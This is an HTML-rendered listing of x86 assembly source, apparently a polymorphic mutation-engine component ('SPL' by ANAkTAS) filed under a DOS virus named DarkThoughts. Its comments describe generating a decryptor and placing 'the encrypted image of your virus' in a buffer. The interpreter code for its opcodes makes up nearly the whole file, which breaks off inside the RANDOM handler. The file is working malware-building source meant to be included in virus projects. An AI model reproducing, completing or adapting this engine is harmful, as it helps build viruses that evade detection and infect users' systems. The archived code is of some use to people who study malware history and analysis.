<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.DarkThoughts.6144 - SPLVM.INC.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;   SPL for Windows V2.20</span><span class="sc0">
</span><span class="sc1">;   (c)1998 by ANAkTAS     </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Description :</span><span class="sc0">
</span><span class="sc1">;   This file contain the &lt;splVM&gt; routine. </span><span class="sc0">
</span><span class="sc1">;   Copy this function to your source file or put the command:</span><span class="sc0">
</span><span class="sc1">;   "INCLUDE splVM.inc" in your source file.   </span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;;--Usage of registers--</span><span class="sc0">
</span><span class="sc1">;;BP=instraction size</span><span class="sc0">
</span><span class="sc1">;;AL=current instruction</span><span class="sc0">
</span><span class="sc1">;;AH=Return value </span><span class="sc0">
</span><span class="sc1">;;SI=pointer to the current SPL instruction</span><span class="sc0">
</span><span class="sc1">;;CX,DX=The math qeue. CX is Math qeue 1, DX is Math qeue 2   </span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;Variables</span><span class="sc0">
</span><span class="sc1">;;0000 SPL BUFFER POINTER</span><span class="sc0">
</span><span class="sc1">;;0002 Math qeue 3 </span><span class="sc0">
</span><span class="sc1">;;0004 Math qeue 4</span><span class="sc0">
</span><span class="sc1">;;0006 Math qeue 5</span><span class="sc0">
</span><span class="sc1">;;0008 randvar</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;Fuction name:&lt;sple&gt; </span><span class="sc0">
</span><span class="sc1">;Description: The SPL Engine. </span><span class="sc0">
</span><span class="sc1">;Input: </span><span class="sc0">
</span><span class="sc1">;DX:SI  = segment and offset of your engine's data. That's</span><span class="sc0">
</span><span class="sc1">;         the data table created by the SPL compiler.        </span><span class="sc0">
</span><span class="sc1">;ES:0000= Segment adress of a reserved memory block.</span><span class="sc0">
</span><span class="sc1">;     This is for internal use by splVM. (variables,uncompressed code,etc)       </span><span class="sc0">
</span><span class="sc1">;         This memory block, must first be initialized </span><span class="sc0">
</span><span class="sc1">;         with &lt;splrand&gt; fuction. </span><span class="sc0">
</span><span class="sc1">;DS:0000= Segment adress of the second memory block. </span><span class="sc0">
</span><span class="sc1">;         Its the buffer where your SPL program will put </span><span class="sc0">
</span><span class="sc1">;         the decryptor and possible you would also like </span><span class="sc0">
</span><span class="sc1">;         to put there the encrypted image of your virus.</span><span class="sc0">
</span><span class="sc1">;         So, the size of this buffer depents on you.</span><span class="sc0">
</span><span class="sc1">;Output:</span><span class="sc0">
</span><span class="sc1">;         Registers and Flags are not effected.</span><span class="sc0">
</span><span class="sc1">;         DS:0000-???? buffer will contain the generated decryptor.</span><span class="sc0">
</span><span class="sc1">;         ES:0000-0511 will contain the variables.</span><span class="sc0">
</span><span class="sc1">;         the rest ES:512-???? will contain garbage. </span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">splvm</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">   

</span><span class="sc1">;Save registers AX,BX,CX,DX,SI,DI </span><span class="sc0">
</span><span class="sc1">;( 7 bytes long ) </span><span class="sc0">
            </span><span class="sc6">PUSHF</span><span class="sc0"> 
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> 
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0"> 
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> 
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0"> 
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> 
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0"> 

</span><span class="sc1">;decompress data table from DX:SI to DS:0200h   </span><span class="sc0">
</span><span class="sc1">;( 50 bytes long )</span><span class="sc0">
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">  
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">  
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">  
        </span><span class="sc6">Lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0"> 
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0"> 
            </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">   
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">spldecompress0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Lodsw</span><span class="sc0"> 
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">spldecompress1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">spldecompress2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">spldecompress0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">spldecompress4</span><span class="sc0">
</span><span class="sc5">spldecompress1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">spldecompress2</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">spldecompress3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">    
            </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">    
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">    
            </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">    
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0"> 
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">spldecompress3</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">spldecompress0</span><span class="sc0">  
</span><span class="sc5">spldecompress4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">    
                
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">  </span><span class="sc1">;exchge DS,ES</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">




</span><span class="sc1">;initialize registers and call the interpreter </span><span class="sc0">
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; IP=0 STARTING VALUE</span><span class="sc0">
            </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">spltranslateinstr</span><span class="sc0"> 
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">  </span><span class="sc1">;exchge DS,ES</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">

</span><span class="sc1">;Restore AX,BX,CX,DX,SI.DI </span><span class="sc0">
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0"> 
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> 
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0"> 
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> 
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0"> 
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> 
            </span><span class="sc6">POPF</span><span class="sc0"> 
            </span><span class="sc6">RET</span><span class="sc0">  </span><span class="sc1">;exit   </span><span class="sc0">


</span><span class="sc5">spltranslateinstr</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0008</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">                          
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0"> 
               
</span><span class="sc1">;decode instruction "ALL"</span><span class="sc0">
</span><span class="sc5">splall</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">251</span><span class="sc0">  </span><span class="sc1">;VI_All</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">splshift</span><span class="sc0">  
                </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> 
</span><span class="sc5">splall1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc0">  </span><span class="sc1">;VI_End   </span><span class="sc0">
                </span><span class="sc6">JnZ</span><span class="sc0">  </span><span class="sc5">splall2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">
</span><span class="sc5">splall2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">spltranslateinstr</span><span class="sc0">          
        </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0"> 
                </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">splall2</span><span class="sc0">
            </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">splgetinstrsize</span><span class="sc0"> 
            </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0"> 
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splall1</span><span class="sc0"> 


</span><span class="sc1">;decode instruction "SHIFT"</span><span class="sc0">
</span><span class="sc5">splshift</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">253</span><span class="sc0">  </span><span class="sc1">;VI_SHIFT </span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spliszero</span><span class="sc0">  
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">  
</span><span class="sc5">splshift1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">235</span><span class="sc0"> </span><span class="sc1">; VI_Noop</span><span class="sc0">
            </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">splshift3</span><span class="sc0"> 
            </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">250</span><span class="sc0"> </span><span class="sc1">;VI_NoopM</span><span class="sc0">
            </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">splshift3</span><span class="sc0"> 
                </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc0">  </span><span class="sc1">;VI_End</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">splshift2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> 
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">
</span><span class="sc5">splshift2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">spltranslateinstr</span><span class="sc0"> 
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">   
            </span><span class="sc6">RET</span><span class="sc0">    
</span><span class="sc5">splshift3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">splgetinstrsize</span><span class="sc0"> 
            </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0"> 
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splshift1</span><span class="sc0"> 


</span><span class="sc1">;//////////////</span><span class="sc0">
</span><span class="sc1">;decode instruction "ISZERO"</span><span class="sc0">
</span><span class="sc5">spliszero</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spl1iszero</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">254</span><span class="sc0"> </span><span class="sc1">;VI_ISZERO</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">splselect</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">00ffh</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">splselectagain2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splselectagain2</span><span class="sc0">

</span><span class="sc1">;//////////////</span><span class="sc0">
</span><span class="sc1">;decode instruction "SELECT"</span><span class="sc0">
</span><span class="sc5">splselect</span><span class="sc4">:</span><span class="sc0">      
</span><span class="sc5">spl5select</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0"> </span><span class="sc1">;VI_SELECT</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">splrandom</span><span class="sc0">  
</span><span class="sc5">splselectagain</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">00ffh</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">                  
</span><span class="sc5">splselectagain2</span><span class="sc4">:</span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> 
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
            </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0"> 
</span><span class="sc5">splselectnext</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">234</span><span class="sc0"> </span><span class="sc1">;VI_End </span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">splselectdiv</span><span class="sc0"> 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">250</span><span class="sc0"> </span><span class="sc1">;VI_NoopM</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">splselectpass</span><span class="sc0"> 
            </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">  
            </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">splselectexec</span><span class="sc0"> 
            </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0"> 
</span><span class="sc5">splselectpass</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">splgetinstrsize</span><span class="sc0"> 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">           
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splselectnext</span><span class="sc0"> 
</span><span class="sc5">splselectdiv</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0"> 
            </span><span class="sc6">JnZ</span><span class="sc0"> </span><span class="sc5">splselectdiv2</span><span class="sc0">        
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">
</span><span class="sc5">splselectdiv2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0"> 
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">  
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0"> 
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">splselectagain2</span><span class="sc0"> 
</span><span class="sc5">splselectexec</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">spltranslateinstr</span><span class="sc0"> 
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">splselectexit</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">
</span><span class="sc5">splselectexit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;//////////////</span><span class="sc0">




</span><span class="sc1">;decode instruction "RANDOM"</span><span class="sc0">
</span><span class="sc5">splrandom</span><span class="sc4">:</span><span class="sc0">      
</span><span class="sc5">spl5</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">252</span><span class="sc0">  </span><span class="sc1">;VI_RANDOM</span><span class="sc0">
            </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">spl_NoopM</span><span class="sc0">  
        
</span><span class="sc5">spl5again</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0"> 
</span><span class="sc5">spl5again2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> 
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
            </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0"> 
</span><span class="sc5">spl5next</span><span class="sc4">:</span><span class="sc0"> 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">234</span><span class="sc0"> </span><span class="sc1">;VI_End </span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">spl5div</span><span class="sc0"> 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">250</span><span class="sc0"> </span><span class="sc1">;VI_NoopM</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">spl5pass</span><span class="sc0"> 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">235</span><span class="sc0"> </span><span class="sc1">;VI_Noop</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">spl5pass</span><span class="sc0"> 
            </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">  
            </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">spl5exec</span><span class="sc0"> 
            </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0"> 
</span><span class="sc5">spl5pass</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">splgetinstrsize</span><span class="sc0"> 
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">           
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">spl5next</span><span class="sc0"> 
</span><span class="sc5">spl5div</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0"> 
            </span><span class="sc6">JnZ</span><span class="sc0"> </span><span class="sc5">spl5div2</span><span class="sc0">        
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">splnopping</span><span class="sc0">
</span><span class="sc5">spl5div2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0"> 
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">  
            </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0"> 
            </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">spl5again2</span><span class="sc0"> 
